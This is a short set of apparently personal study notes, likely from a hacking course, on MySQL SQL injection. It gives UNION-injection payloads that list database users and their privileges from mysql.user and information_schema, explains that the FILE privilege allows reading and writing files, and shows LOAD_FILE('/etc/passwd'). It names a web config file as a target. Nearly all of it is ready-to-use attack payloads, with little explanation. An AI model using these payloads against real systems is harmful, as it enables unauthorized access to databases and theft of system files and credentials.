most likely only if we are database admin

find current user
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
do it with a union injection

finding user privilege
```
SELECT super_priv FROM mysql.user
```
in an union injection
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
see all privileges;
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
if FILE is listed in here, we can read files and write files

loading file command
```sql
SELECT LOAD_FILE('/etc/passwd');
```
other interesting files to open:
/var/www/html/config.php

note: if it renders html, just inspect to see the html source (CTRL + U)
